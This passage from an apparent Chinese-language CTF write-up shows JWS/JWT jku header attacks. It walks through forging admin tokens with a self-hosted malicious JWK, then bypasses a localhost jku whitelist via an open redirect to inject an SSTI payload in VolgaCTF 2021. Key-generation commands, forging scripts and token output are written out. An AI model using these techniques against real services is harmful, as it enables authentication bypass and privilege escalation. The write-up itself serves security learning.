     curl http://witrap.com:8000/jwks.json
得到可以看到RSA加密的n和e都在里面。
我们的目标是以admin角色访问到/goldenticket，所以这里可以利用上面的攻击方式。
具体流程如下：
  1. 1.本地生成自己的公私钥对
  2. 2.搭建本地恶意服务器
  3. 3.使用自己的n和e伪造一个JWK并放在恶意服务器上
  4. 4.利用公私钥伪造JWS，将role字段改成admin，jku指向该恶意服务器上的JWK文件
  5. 5.带上JWS访问/goldenticket
#####  生成RSA公私钥对
    openssl genrsa -out keypair.pem 2048
产生一个2048位的密钥
    openssl rsa -in keypair.pem -pubout -out public.crt
根据密钥产生公钥
    openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkc8.key
* * *
openssl pkcs8命令：
    openssl pkcs8 [-topk8] [-inform PEM|DER] [-outform PEM|DER] [-in filename] [-passin arg] [-out filename] [-passout arg] [-noiter] [-nocrypt] [-nooct] [-embed] [-nsdb] [-v2 alg] [-v2prf alg] [-v1 alg] [-engine id]
具体可参考：
#####  伪造JWS
    -----BEGIN PUBLIC KEY-----    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyBoYKQHzkKJQQQGdHubO
    Cy6VwQdrr2Pn269ovuZ9Y6155pJCskXApCHG2qV7yIXpHz1XrDkFe8ZmTiPzPtQC
    u220HFrH3KRkTfECzGkT4LJB8jYySL18Ih7zf6A+wpCVCDYEZWXlyuwkqdqRzBRz
    F8kxZgFzVwRfeECF8RnO1vPVMZ9qNX7i1+u6bA83LNjYQCSNZHo+Y4K3deb+MK7l
    zcSnKsw2EQvuaUJKEExFoFeruXoaAsouwUMRERr/pQPxvk+6voWyTfPJiNKxI0JD
    oNdsYNj0JPWqAnOcsF+G2UGDmBJ7UhBxKutBt7OKAUWbOpZYd9YkmT5rL3hAeCia
    YwIDAQAB
    -----END PUBLIC KEY-----    
将产生的public key完整得粘贴到公钥处
私钥也是一样
然后修改上面jku的地址：
    http://192.170.138.2:8080/issue
在右方就可以得到伪造好的JWS
#####  搭建恶意服务器
根据jwks.json文件的格式：
我们需要修改n和e
利用如下脚本：
    from Crypto.PublicKey import RSA
    fp = open("publickey.crt", "r")
    key = RSA.importKey(fp.read())
    fp.close()
    print "n:", hex(key.n)
    print "e:", hex(key.e)
替换n和e得到伪造的JWK
下一步我们可以使用python的SimpleHTTPServer快速搭建服务器
    python -m SimpleHTTPServer 8080
SimpleHTTPServer可以快速构建一个web服务，并且将当前目录作为web服务根目录，当前目录存放着伪造的jwks.json
携带伪造的JWS进行访问/goldenticket，这时成功通过验证
###  Volgactf 2021 JWS：开放重定向利用
当时没做出来，参考：[JWS writeup](https://telegra.ph/JWS-writeups-03-28)
####  场景描述
  * 1.5000端口存在返回JWS的API 
    * jws中存在jku
    * jku存在白名单过滤机制，限制在localhost域
  * 2.5000/check_jws?payload= 可以进行JWS的检查并且展示Payload部分内容 
    * 存在SSTI漏洞
  * 3.5001/vuln/JWK可以得到JWK
需要利用重定向通过验证，然后利用SSTI拿到flag
####  实践过程
访问5000端口：
返回JWS，可以看到里面的jku，指向`http://localhost:5001/vuln/JWK`
访问`http://localhost:5001/vuln/JWK`得到JWK
但是这里的jku被白名单限定在了localhost域，无法直接修改jku指向我们自己的服务器
再次回顾一下jku的利用手段
  * 1.存在文件上传
  * 2.存在重定向
  * 3.存在CRLF注入
#####  重定向利用
通过扫描目录可以发现/vul/redirect API
直接访问会回显 bad params
参数名我们是不知道的，所以需要fuzz API的参数，可以使用该字典：[2020-11-30-open-redirect-params.txt](https://github.com/ptswarm/ptswarm-twitter/blob/main/2020-11-30-open-redirect-params.txt)
得到参数endpoint=
重定向链接：
    /vuln/redirect?endpoint=
#####  编写脚本
#####  生成JWK
使用python jscrypto库生成jwk
    def generate_key():
       key = jwk.JWK.generate(kty='RSA', size=2048)
       print(key.export_public())
       print(key.export())
    {"e":"AQAB","kty":"RSA","n":"1cOFAHlq4MjGXJztC1-H8RI0D0TgYw6UyZgXAv-Gg5t7DuPa9ssqw8h_z04wusMJ9GwN71DqPtijyjpblaKcKSmJN61PCPVjthkF88BfvZ7SFQjA-XVuEsFwOGOfvtmWQhRJmNAvZt_y9UfOe35EleeAOWtNkYQKa-NALu0-D_mLSuxNExbxCymqwkuZVTSrHdUyul-ohReTdjx8hJAVOsV4yRq7VIrblftLMTSlD3nUrPrsZNZf77ysAdD4gEffjCL7Osp0cjufJJlTndBhh-7I5l2rgcNQpsxSwYE_jegAQUIjRveVdq6CzXj104uYGPg3qda1xIi3VyOsb4wfxQ"}
    {"d":"VtSV6Qxo8qf7k1EXJMCIWs83IGCs-O_KVl0WM9yRylHU2caKgici1uZRrGapeqORHpzpyCVJEYA0gAfWfeDQqBO8LkaSzSPIfgaKGWoyObcSxQKKSIp_zNSQfgdRs1d1JqBRCOa_6nzblvC1Ggq_V1jzB9_jYVGOXiawQp-RzzCjRt6_BSr7Hg2xC0v_chwUt_yBhvDGz5x0rbspYcBL0OzI1hhZ1Tujk3MRrMfbIvBeoyRb_582UYQBc886SmAF6ue3eBc0v15mAX7qptCb7RLOVBYJwA-eYGktll9Orx-IIvy1GJpZdCV7FBGh-1AlCgM2O0KyBAwT3kRA1PYUgQ","dp":"gu2vc9u13DNV1PUF0Zk5lliLQjzhsRqOwl9drbdUQ7JgkyVzfccZ8QhfrHVjgAFzD54I1zoNewXi-4jHts4O3ud1QOvt0tOJM-2OokFg29i0GoSXVT05IHb6VAmjAcfiC65SoS7sTm-V0oPp0DLswstGbk5zsAn2JL2RjBNYsz0","dq":"MsgjIE3OYNQ6HtjjeBIJrG7eAAProYzqIvhNhBK4vfoEiA4V-1GPw2Gxn9xkvzdXFWRM0eih8Pu07-CgiqYGfkUSgkvmKynvr_oH8stZ-wKZMs9jsDsBuV0y6CQUKiFRTgWkNw3o6408XUwF5K46oAjtp0GUG-CNNNoIc45jN0E","e":"AQAB","kty":"RSA","n":"1cOFAHlq4MjGXJztC1-H8RI0D0TgYw6UyZgXAv-Gg5t7DuPa9ssqw8h_z04wusMJ9GwN71DqPtijyjpblaKcKSmJN61PCPVjthkF88BfvZ7SFQjA-XVuEsFwOGOfvtmWQhRJmNAvZt_y9UfOe35EleeAOWtNkYQKa-NALu0-D_mLSuxNExbxCymqwkuZVTSrHdUyul-ohReTdjx8hJAVOsV4yRq7VIrblftLMTSlD3nUrPrsZNZf77ysAdD4gEffjCL7Osp0cjufJJlTndBhh-7I5l2rgcNQpsxSwYE_jegAQUIjRveVdq6CzXj104uYGPg3qda1xIi3VyOsb4wfxQ","p":"82Nu0AhRyqM1AMEOhR-Ld1s1FEDFYPaJlLTsyXeSsdJFERnKMAQ9FW49exwjNprvw5fgB7BkL5JtAO9b1OjIcz2SBZmP1OgED_69l-LrQ1xT_nczpiMeYvkv9Etdv1njK01jBRZEVudG4Qr1tiDI654Yr4dNIG8db3tdnk_WVqU","q":"4Ncc9ZrEYMIrbc5MvK3ywpy8AvBTHET3hgJKlRYvrU8DHUYUbq4KZK6O4h1Xv3TrSxWEwn1Z7VmWJcybS9S2khmt32OF81eG9-aty0XZtxgulRe8wCi2KCzDmDZzJ0kCcchZUr3Chj8FeXOwdJH1G9ZQUiwgMZ0Fu0qQVi2ReqE","qi":"RbZJiXGM4NBvyoBbEt0Eg1Sw22bEmQqpzYt16AcLjrpl_MTDGntuaOMhN7a3I4n3BoeaPytEy-I41UVLu0wyGYz91RtZWrFNvwd1R2TNvm5MfP5Xsr6hKSaDvAkvOZbg83VDXO2HeJ9ot6WwRZTKlivhLhJV-KxRX1hCbsv_VoU"}
#####  生成JWS
我们需要伪造jku，并且在JWS解密后的内容中附加上SSTI payload，比如`{{ config }}`
    jku = 'http://localhost:5001/vuln/redirect?endpoint=http://localhost:5002/hack' #localhost:5002 its own server, 5001 server with vuln open redirect
    payload = '{{config}}'
    key = jws.JWK(**json.loads(app.config['all_key']))
    jwstoken = jws.JWS(payload.encode('utf-8'))
    jwstoken.add_signature(key=key,alg='RS256',protected=None,header=json_encode({"kid": key.thumbprint(), 'jku':jku, "alg":"RS256"}))
    sig = jwstoken.serialize()
jwk文档：[JSON Web Key
(JWK)](https://jwcrypto.readthedocs.io/en/latest/jwk.html#json-web-key-jwk)
    >>> ka
    >>> jwstoken
    >>> jwstoken.add_signature(key=key,alg='RS256',protected=None,header=json_encode({"kid": ka.thumbprint(), 'jku':jku, "alg":"RS256"}))
    >>> jwstoken.serialize()
    '{"header":{"alg":"RS256","jku":"http://localhost:5001/vuln/redirect?endpoint=http://localhost:5002/hack","kid":"BYa3XpycMhDud1d-fYTijehS75jH90eTPxVYdUx8DqA"},"payload":"e3tjb25maWd9fQ","signature":"kwNzA48stR8tqbceOxHvHUyNCB9dzx02mPLRLpd9cjD5vzFio5rBMEIraLEp8WwLaH1T_Nofz7e2ToPCdWFS5nGv6jcGCJ9DrFMwL9vq4M6pfTLE7hKlGDtE7iFAIvZqL4MEAx7IdSC07zd4yTRNBy48q64yXEMqA8HigvETS14_DYfiDDkSkHNSxLTuItI8qOxhfLIj1UVTZMci1mi5PQ00R66q5RPFsy-6v6ZIrRjPkeODc4DIlzpv525NkREMcCrAgpb7XvrV1eVWJMWDwkZQoXf6XgJapvhRveegk9GYkLETbz3Lqwh13KNNZw9doVSqL1oyRhjxgDHyT1cQlg"}'
#####  完整脚本：
使用flask构建web服务，访问/hack即返回伪造的JWK。
    from flask import Flask, request, redirect, jsonify, send_from_directory